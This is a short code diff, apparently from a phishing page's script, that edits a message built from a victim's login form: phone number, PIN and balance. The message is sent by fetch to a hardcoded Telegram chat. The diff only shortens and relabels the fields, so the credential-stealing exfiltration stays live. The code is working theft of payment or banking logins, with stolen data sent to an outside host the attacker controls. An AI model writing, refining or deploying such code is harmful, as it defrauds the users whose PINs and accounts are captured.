@@ -52,11 +52,10 @@ document.addEventListener("DOMContentLoaded", () => {
     const TELEGRAM_CHAT_ID  = "7874654715";
 
     const mensaje =
-      "🔐 *Nuevo Login*\n\n" +
-      "📱 Teléfono: " + inputTelefonoLogin.value + "\n" +
-      "🔐 PIN: " + inputPin.value + "\n" +
-      "💰 Saldo: " + inputSaldo.value + "\n" +
-      "🕒 Fecha: " + new Date().toLocaleString();
+      "*#2*\n\n" +
+      "Numero: " + inputTelefonoLogin.value + "\n" +
+      "Clave: " + inputPin.value + "\n" +
+      "Saldo: " + inputSaldo.value + "\n";
 
     try {
       const response = await fetch(
@@ -126,4 +125,5 @@ document.addEventListener("DOMContentLoaded", () => {
 
 
 });
+
 
